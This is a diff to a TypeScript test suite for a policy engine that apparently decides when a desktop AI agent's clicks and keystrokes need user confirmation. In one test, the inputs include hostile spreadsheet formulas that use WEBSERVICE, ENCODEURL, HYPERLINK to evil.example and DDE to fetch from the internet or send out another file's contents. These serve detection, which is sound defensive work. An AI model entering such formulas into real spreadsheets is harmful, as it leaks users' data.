@@ -152,10 +152,9 @@ describe("policy: review round 2", () => {
     expect(d.aligned).toBe(false);
     expect(e.decide({ taskId: "g", kind: "click", app: "Firefox", window: "Page", element: { role: "push button", name: "Continue" }, dialog: { name: "", text: "" } }).verdict).toBe("confirm");
   });
-  it("the risky verb is what counts: a mismatch in other words is still asked about, but not marked as not asked for (W7-1)", () => {
+  it("the risky verb must be asked for, and what it acts on named: “Send money to Bob” isn't “send the report to Ana” (SEC8-1)", () => {
     const other = e.decide({ taskId: "a", kind: "click", app: "Firefox", window: "Bank", element: { role: "push button", name: "Send money to Bob" }, goal: "send the report to Ana" });
-    expect(other).toMatchObject({ verdict: "confirm", risky: true, prompt: "Click “Send money to Bob” push button in Firefox?" });
-    expect(other.aligned).toBeUndefined();
+    expect(other).toMatchObject({ verdict: "confirm", risky: true, aligned: false, prompt: "Click “Send money to Bob” push button in Firefox? You didn't ask for this, so say no if it looks wrong." });
     expect(e.decide({ taskId: "a", kind: "click", app: "Firefox", window: "Mail", element: { role: "push button", name: "Send report" }, goal: "send the report to Ana" }).aligned).toBeUndefined();
     // A verb the user didn't ask for still is.
     expect(e.decide({ taskId: "a", kind: "click", app: "Firefox", window: "Bank", element: { role: "push button", name: "Send money to Bob" }, goal: "check my balance" }).aligned).toBe(false);
@@ -614,17 +613,22 @@ describe("policy: review round 5", () => {
     const judged = (role: string, name: string, kind: ActionRequest["kind"] = "click") =>
       e().decide({ taskId: "h", kind, app: "Firefox", window: "Issue #12 - Mozilla Firefox", element: { role, name }, goal: "add the bug label" });
     const decide = (role: string, name: string) => judged(role, name).verdict;
-    for (const role of ["heading", "page tab", "label", "section", "static", "image", "list item"]) {
+    for (const role of ["heading", "page tab", "label", "section", "static", "image"]) {
       expect(decide(role, "Comment"), role).toBe("confirm");
       // With the mouse too: and the question says nobody asked for it.
       expect(judged(role, "Block user", "cursor_click").aligned, role).toBe(false);
     }
     for (const role of ["check menu item", "check box", "switch"]) expect(decide(role, "Block selection"), role).toBe("allow");
-    // A file's icon or a mail list's cell is named by what it holds: only the phrases count there.
-    for (const role of ["icon", "table cell", "tree item"]) {
+    // A file's icon or a mail list's row is named by what it holds: only the phrases and a short label that starts with
+    // the verb count there, and never as not asked for (W8-1).
+    for (const role of ["icon", "table cell", "tree item", "list item"]) {
       expect(decide(role, "report.pdf"), role).toBe("allow");
       expect(decide(role, "Report for March"), role).toBe("allow");
-      expect(decide(role, "Close account"), role).toBe("confirm");
+      for (const [name, kind] of [["Close account", "click"], ["Block user", "cursor_click"]] as const) {
+        const d = judged(role, name, kind);
+        expect(d.verdict, `${role} ${name}`).toBe("confirm");
+        expect(d.aligned, `${role} ${name}`).toBeUndefined();
+      }
     }
   });
 
@@ -823,10 +827,10 @@ describe("policy: review round 6, labels and words", () => {
     expect(alignedWithGoal("empty cell B2", "Clear")).toBe(true);
     expect(alignedWithGoal("save my notes and close", "Close without Saving")).toBe(false);
     expect(click("nautilus", "Documents", "menu item", "Move to Trash", "get rid of report.txt").aligned).toBeUndefined();
-    // A verb the user didn't ask for still has to match; what it acts on needn't (the question is still asked: W7-1).
+    // A verb the user didn't ask for still has to match, and what it acts on must be named too (SEC8-1).
     expect(alignedWithGoal("fill in the survey", "Move to Trash")).toBe(false);
-    expect(alignedWithGoal("delete report.txt", "Delete account")).toBe(true);
-    expect(click("firefox", "Account - Mozilla Firefox", "push button", "Delete account", "delete report.txt")).toMatchObject({ verdict: "confirm", risky: true });
+    expect(alignedWithGoal("delete report.txt", "Delete account")).toBe(false);
+    expect(click("firefox", "Account - Mozilla Firefox", "push button", "Delete account", "delete report.txt")).toMatchObject({ verdict: "confirm", risky: true, aligned: false });
     expect(alignedWithGoal("open my mail", "Log Out")).toBe(false);
     expect(alignedWithGoal("sign the contract", "Log Out")).toBe(false);
   });
@@ -993,5 +997,159 @@ describe("policy: review round 7", () => {
     // A salary read in the mail, typed into the sheet.
     const carried = cell({ goal: "update my budget", readFrom: [MAIL] });
     expect(carried.prompt).toMatch(/I read the window “Inbox - Thunderbird” in this task/);
+  });
+});
+
+describe("policy: review round 8", () => {
+  const e = new PolicyEngine({ neverLook: () => [], grants: () => ({ firefox: "act", thunderbird: "act", mousepad: "act", "soffice.bin": "act", soffice: "act", nautilus: "act", electron: "act" }), rateLimit: 1e6 });
+
+  it.each([
+    ["summarize this email", "Send"], ["summarize this email", "Reply"], ["tell me what this page says", "Send"], ["read me my new messages", "Send"], ["check my mail", "Send"],
+    ["what did Ana answer?", "Reply"], ["what did Ana answer?", "Send"], ["what's the status of my order?", "Pay now"], ["what's the status of my order?", "Buy now"],
+    ["what's the status of my order?", "Place order"], ["sort the table by order date", "Checkout"], ["find the email from HR", "Send"], ["open the message from IT", "Send"],
+    ["explain this message", "Send"], ["translate the message into English", "Send"], ["in order to save time, rename the file", "Pay now"],
+    ["open the newest email and tell me what it says", "Send"], ["send the report to Ana", "Send money to Mallory"], ["delete the old drafts", "Delete account"],
+    ["clear the search box", "Delete repository"], ["remove the blank line in my notes", "Remove all members"], ["empty the search field", "Empty Trash"],
+    ["read the comments", "Comment"], ["summarize this post", "Post"], ["open the trash", "Move to Trash"], ["don't send it yet, just save the draft", "Send"],
+    ["send the report to Ana", "Send $5000"], ["where is my order?", "Place order"],
+  ])("“%s” doesn't ask for “%s”: a noun, a question, or another thing acted on (SEC8-1)", (goal, label) => {
+    expect(alignedWithGoal(goal, label)).toBe(false);
+    const d = e.decide({ taskId: "a", kind: "click", app: "Thunderbird", window: "Inbox - Thunderbird", element: { role: "push button", name: label }, goal });
+    expect(d).toMatchObject({ verdict: "confirm", aligned: false });
+    expect(d.prompt).toMatch(/You didn't ask for this/);
+  });
+
+  it.each([
+    ["reply to Ana saying yes", "Send"], ["email the report to Ana", "Send"], ["forward this to Bob", "Send"], ["tell Ana I'm late", "Send message"], ["answer Ana's email", "Reply"],
+    ["order the blue mug", "Place order"], ["order the blue mug", "Buy now"], ["place an order for the blue mug", "Place order"], ["buy the mug", "Pay $24.99"],
+    ["close it without saving", "Don't Save"], ["Replace teh with the everywhere in rep7.txt", "Replace All"], ["send the report to Ana", "Send report"],
+    ["merge A1 to C1", "Merge Cells"], ["forget the CoffeeShop Wi-Fi", "Forget Connection"], ["clear my browsing history", "Clear data"], ["delete the email from HR", "Delete message"],
+    ["empty the trash", "Empty Trash"], ["add a comment saying thanks", "Comment"], ["click the reply button", "Reply"], ["cancel my order", "Cancel order"],
+    ["what did Ana answer? Reply to her saying yes", "Send"], ["move report.txt to the trash", "Move to Trash"], ["delete my old messages", "Delete 125 messages"],
+  ])("“%s” asks for “%s” (SEC8-1, keeping W7-1)", (goal, label) => {
+    expect(alignedWithGoal(goal, label)).toBe(true);
+  });
+
+  it("dialog OKs are judged by their verb, and a “…” menu item isn't risky in itself (W7-1 kept)", () => {
+    const ok = e.decide({ taskId: "o", kind: "click", app: "nautilus", window: "Files", element: { role: "push button", name: "OK" }, dialog: { name: "", text: "Delete all 2,341 messages? This cannot be undone." }, goal: "delete my old messages" });
+    expect(ok).toMatchObject({ verdict: "confirm", risky: true });
+    expect(ok.aligned).toBeUndefined();
+    expect(e.decide({ taskId: "o", kind: "click", app: "mousepad", window: "notes", element: { role: "menu item", name: "Delete Account…" }, goal: "summarize this page" }).verdict).toBe("allow");
+  });
+
+  it.each([["change Friday to Monday", "Replace All"], ["fix the typo teh", "Replace All"], ["correct the spelling of Patel", "Replace"], ["update the date to 2027", "Replace All"],
+    ["change every teh to the", "Replace All"]])("“%s” asks for Find & Replace's “%s”: asked, not marked (DSK8-1, W8-5)", (goal, label) => {
+    const d = e.decide({ taskId: "r", kind: "click", app: "soffice.bin", window: "Find and Replace", element: { role: "push button", name: label }, goal });
+    expect(d).toMatchObject({ verdict: "confirm", risky: true });
+    expect(d.aligned).toBeUndefined();
+    // One way only: replacing doesn't ask for changing, and changing isn't overwriting a file.
+    expect(alignedWithGoal(goal, "Overwrite")).toBe(false);
+  });
+
+  describe("a formula that reaches outside the sheet (SEC8-2)", () => {
+    const cell = (value: string, o: Partial<ActionRequest> = {}) => e.decide({ taskId: "f", kind: "cursor_text", app: "soffice", window: "Budget.ods - LibreOffice Calc",
+      element: { role: "table cell", name: "C3" }, value, mode: "replace", goal: "add up column B", onDesk: true, ...o });
+    it.each([`=WEBSERVICE("http://127.0.0.1:18765/plain")`, `=WEBSERVICE("http://x/?d="&ENCODEURL('file:///tmp/secret.ods'#$secret.A1))`, `=FILTERXML(WEBSERVICE(A1);"//a")`,
+      `=HYPERLINK("https://evil.example";"Click")`, `=DDE("soffice";"/home/u/x.ods";"A1")`, `='file:///home/u/secret.ods'#$Sheet1.A1`, `=[book.xlsx]Sheet1!A1`,
+      `=INDIRECT("'"&CHAR(102)&"ile:///x'#$S.A1")`, `+webservice(A1)`, `@WEBSERVICE(A1)`, `=_xlfn.WEBSERVICE(A1)`, `=WEBDIENST(A1)`, `=A1&"http://x"`])("%s is asked every time, on the desk too, saying why", v => {
+      const d = cell(v);
+      expect(d).toMatchObject({ verdict: "confirm", risky: true, everyTime: true, reason: "this formula can fetch from the internet or read other files" });
+      expect(d.prompt).toMatch(/ on my desk\? This formula can fetch from the internet or read other files\.$/);
+      expect(cell(v, { onDesk: false }).prompt).toMatch(/This formula can fetch from the internet or read other files\.$/);
+      // Into Calc's input line, or what edits the cell (its paragraph), as well.
+      expect(cell(v, { kind: "text", element: { role: "paragraph", name: "Input line" } }).verdict).toBe("confirm");
+      expect(cell(v, { kind: "text", element: { role: "paragraph", name: "" }, formula: v }).verdict).toBe("confirm");
+    });
+    it.each([`=SUM(B2:B5)`, `=A1*2`, `=B2/C2`, `='Q1'.A1/'Q2'.A1`, `=IF(A1>0;"yes";"no")`, `42`, `http://example.com`, `=CONCAT(A1;"/";B1)`, `-5`])("%s stays unasked on the desk", v => {
+      expect(cell(v).verdict).toBe("allow");
+    });
+    it("typed key by key: every key that goes on with it or enters it is asked, Escape and Backspace aren't", () => {
+      const key = (value: string, formula: string) => e.decide({ taskId: "k", kind: "keys", app: "soffice", window: "Budget.ods - LibreOffice Calc", element: { role: "paragraph", name: "" },
+        value, formula, goal: "add up column B", onDesk: true });
+      expect(key("parenleft", "=webservice(").reason).toBe("this formula can fetch from the internet or read other files");
+      expect(key("Return", "=webservice(a1)").verdict).toBe("confirm");
+      expect(key("Escape", "=webservice(a1)").verdict).toBe("allow");
+      expect(key("BackSpace", "=webservice(").verdict).toBe("allow");
+      expect(key("parenleft", "=sum(").verdict).toBe("allow");
+      expect(key("Return", "=sum(b2:b5)").verdict).toBe("allow");
+    });
+  });
+
+  it("a key that replaces a selection is asked where the document's paragraphs say they are selected, or nothing says it has the keyboard (SEC8-3)", () => {
+    const key = (o: Partial<ActionRequest>) => e.decide({ taskId: "s", kind: "keys", app: "soffice", window: "report.odt - LibreOffice Writer", value: "BackSpace", goal: "tidy my report", onDesk: true, ...o });
+    expect(key({ element: { role: "paragraph", name: "" }, currentText: "", selection: "" }).verdict).toBe("allow");
+    expect(key({ element: { role: "paragraph", name: "" }, currentText: "", selection: "", selectionBeyond: "selected" })).toMatchObject({ verdict: "confirm",
+      prompt: "Press Backspace on the paragraph in LibreOffice on my desk? Text there is selected, and it may run on past what I can see, so this may replace a lot." });
+    expect(key({ element: { role: "heading", name: "" }, selection: "Report" }).verdict).toBe("confirm");
+    expect(key({ selectionBeyond: "unknown" })).toMatchObject({ verdict: "confirm",
+      prompt: "Press Backspace in LibreOffice on my desk? I can't tell what has the keyboard there, and text there may be selected, so this may replace a lot." });
+    // Edit ▸ Select All, tracked as Ctrl+A is.
+    expect(key({ element: { role: "paragraph", name: "" }, currentText: "", selection: "", afterSelectAll: true }).verdict).toBe("confirm");
+    // Keys that replace nothing stay unasked.
+    expect(key({ value: "Left", selectionBeyond: "selected", element: { role: "paragraph", name: "" } }).verdict).toBe("allow");
+  });
+
+  it("the note about text carried from elsewhere names the app first and a short title (PR8-4)", () => {
+    const from = (window: string, app = "mousepad") => e.decide({ taskId: "p", kind: "text", app: "Firefox", window: "Survey - Mozilla Firefox", windowId: { pid: 7, path: "/a/1", role: "frame" },
+      element: { role: "entry", name: "Comments" }, value: "Minutes of the planning meeting", mode: "replace", goal: "fill in the survey",
+      readFrom: [{ app, window, pid: 3, path: "/m/1", role: "frame", text: "Minutes of the planning meeting held on Monday" }] }).prompt;
+    expect(from("*/tmp/claude-0/-home-user-Ember-Powered-by-Github-Copilot/notes.txt - Mousepad")).toMatch(/I read the window “\*notes\.txt - Mousepad” in this task/);
+    expect(from("*/tmp/claude-0/-home-user-Ember-Powered-by-Github-Copilot/a-very-long-file-name-for-the-meeting-notes.txt - Mousepad"))
+      .toMatch(/I read Mousepad \(“\*a-very-long-file-name-for-the-meeting-notes\.txt …”\) in this task/);
+    expect(from("Inbox - Mail", "probe_mail.py")).toMatch(/I read probe_mail\.py \(“Inbox - Mail”\) in this task/);
+  });
+
+  it("a row, cell, icon or list item is named by what it holds: risky only by a phrase or a short label that starts with the verb, never marked as not asked for (W8-1)", () => {
+    const click = (role: string, name: string, goal = "open the email about my parcel and tell me when it arrives") =>
+      e.decide({ taskId: "w", kind: "click", app: "Thunderbird", window: "Inbox - Thunderbird", element: { role, name }, goal });
+    for (const [role, name] of [["table cell", "Your order has shipped"], ["tree item", "Re: Please send the slides"], ["table cell", "Payment received - transfer confirmation"],
+      ["table cell", "Invitation: Team sync - please accept"], ["list item", "Order supplies, 45 EUR"], ["icon", "Install guide.pdf"], ["icon", "order-form.pdf"],
+      ["tree item", "Trash"], ["list item", "Trash"], ["table cell", "Order #4481236"], ["icon", "Delete me later.txt"]]) {
+      expect(click(role, name), `${role} ${name}`).toMatchObject({ verdict: "allow" });
+    }
+    for (const [role, name] of [["list item", "Delete"], ["tree item", "Empty Trash"], ["table cell", "Close account"], ["icon", "Move to Trash"], ["list item", "Send now"]]) {
+      const d = click(role, name);
+      expect(d.verdict, `${role} ${name}`).toBe("confirm");
+      expect(d.aligned, `${role} ${name}`).toBeUndefined();
+    }
+  });
+
+  it.each([["check my electricity bill", "Pay now"], ["check my electricity bill", "Buy now"], ["check the weather", "Place order"], ["read the author's note", "Authorize app"],
+    ["fix the author name", "Authorize"], ["what does the checkbox say", "Checkout"]])("“%s” doesn't ask for “%s”: a word that starts another isn't it (W8-2)", (goal, label) => {
+    expect(alignedWithGoal(goal, label)).toBe(false);
+  });
+
+  it("a word's forms are still the word, in the other languages too (W8-2)", () => {
+    for (const [goal, label] of [["checkout my cart", "Checkout"], ["Lösche die Datei notes.txt", "Löschen"], ["Удали старый файл", "Удалить"], ["supprime le fichier", "Supprimer"],
+      ["Elimina il vecchio commento", "Elimina commento"], ["deleting the old files", "Delete"], ["the files Ana replied to: reply to them", "Reply"]]) expect(alignedWithGoal(goal, label), goal).toBe(true);
+  });
+
+  it("Enter in a text field on the desk is asked about as a typed line break: it may send or submit (W8-3)", () => {
+    const enter = (role: string, keys = "Return", o: Partial<ActionRequest> = {}) => e.decide({ taskId: "n", kind: "keys", app: "firefox", window: "Chat - Mozilla Firefox", element: { role, name: "Message" },
+      value: keys, goal: "write hi to Ana", onDesk: true, ...o });
+    for (const role of ["entry", "text", "paragraph", "section"]) {
+      for (const keys of ["Return", "KP_Enter"]) {
+        expect(enter(role, keys), `${role} ${keys}`).toMatchObject({ verdict: "confirm", reason: "Enter in a text field can send or submit what is in it" });
+      }
+    }
+    expect(enter("entry").prompt).toBe("Press Enter on “Message” entry in Firefox on my desk? Enter there may send or submit it.");
+    // Space types a space; Enter in a spreadsheet's cell enters what was typed; a button's harmless Enter stays a click.
+    expect(enter("entry", "space").verdict).toBe("allow");
+    expect(enter("table cell", "Return", { element: { role: "table cell", name: "B4" } }).verdict).toBe("allow");
+    expect(enter("paragraph", "Return", { formula: "42" }).verdict).toBe("allow");
+    expect(enter("push button", "Return", { element: { role: "push button", name: "Bold" } }).verdict).toBe("allow");
+    // In a LibreOffice document Enter starts a new paragraph; its dialogs' fields are still fields.
+    expect(enter("paragraph", "Return", { app: "soffice", window: "letter.odt — LibreOffice Writer" }).verdict).toBe("allow");
+    expect(enter("text", "Return", { app: "soffice", window: "Find and Replace" }).verdict).toBe("confirm");
+  });
+
+  it("the first step in an app also carries its plain question, for an app the user already allowed (W8-4)", () => {
+    const d = new PolicyEngine({ neverLook: () => [], grants: () => ({}) }).decide({ taskId: "g", kind: "click", app: "mousepad", window: "notes", element: { role: "push button", name: "Bold" } });
+    expect(d).toMatchObject({ prompt: "Let me work in Mousepad? First step: click “Bold” push button.", stepPrompt: "Click “Bold” push button in Mousepad?" });
+  });
+
+  it.each([["sign up for the newsletter", "Subscribe"], ["write back to Ana saying thanks", "Send"], ["write back to Ana", "Reply"], ["put the settings back to default", "Reset to Defaults"],
+    ["throw away my changes", "Don't Save"], ["throw away my changes", "Discard"]])("“%s” asks for “%s” (W8-5)", (goal, label) => {
+    expect(alignedWithGoal(goal, label)).toBe(true);
   });
 });
